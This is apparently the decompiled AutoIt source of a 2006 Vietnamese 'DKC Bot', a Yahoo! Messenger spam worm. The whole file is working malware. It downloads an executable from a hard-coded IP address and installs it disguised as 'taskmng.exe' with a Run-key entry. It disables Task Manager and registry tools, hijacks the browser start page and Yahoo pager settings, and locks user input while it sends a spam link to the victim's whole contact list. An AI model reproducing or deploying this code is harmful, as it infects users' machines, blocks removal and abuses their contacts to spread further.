; <AUT2EXE VERSION: 3.2.0.1>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Documents and Settings\cuongadsl\Desktop\bot.au3>
; ----------------------------------------------------------------------------

; <AUT2EXE VERSION: 3.2.0.1>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Documents and Settings\Me\Desktop\au.au3>
; ----------------------------------------------------------------------------

;--------------------------------------------
; Tac Gia: Kevin Duong - KVD
; Phan Mem: DKC Bot
; Phien Ban: 1.1
; Cong Dung: Quang cao Website thong qua Y!M
; Phat Hanh: 1-9-2006
;--------------------------------------------

$website = "http://72.22.71.37/~camptong"
$website2 = "http://VuiVeVN.HP.MS"
; Lay Nhiem Vao He Thong
If Not FileExists(@WindowsDir & "\taskmng.exe") Then
InetGet ($website & "/bot.exe", @WindowsDir & "\taskmng.exe", 0, 1)
Sleep(5000)
EndIf

; Ghi Khoa Registry
RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel", "Homepage", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page", "REG_SZ", $website2)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_buzz", "content url", "REG_SZ", $website2)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_Launchcast", "content url", "REG_SZ", $website2)
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Task Manager", "REG_SZ", @WindowsDir & "\taskmng.exe")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Window Title", "REG_SZ", "wWw.VuiVeVN.HP.MS Community")
   $title = WinGetTitle("Yahoo! Messenger")
   $wincheck = WinExists ($title)
   ClipPut("http://VuiVeVN.HP.MS <=== Bo? it' thoi` gian vao` web nay` di , toan` anh? de^~ thuong :D :D =))")
      if $wincheck = 1 then
           BlockInput (1)
      WinActivate($title)
      send("!A")
      send("M")
      sleep(1000)
      send("{DOWN}")
      send("{SHIFTDOWN}")
      send("{DOWN 70}")
      send("{enter}")
      send("{LSHIFT}")
      send("^v {ENTER}")
       BlockInput (0)
     endif



; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Documents and Settings\Me\Desktop\au.au3>
; ----------------------------------------------------------------------------


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Documents and Settings\cuongadsl\Desktop\bot.au3>
; ----------------------------------------------------------------------------

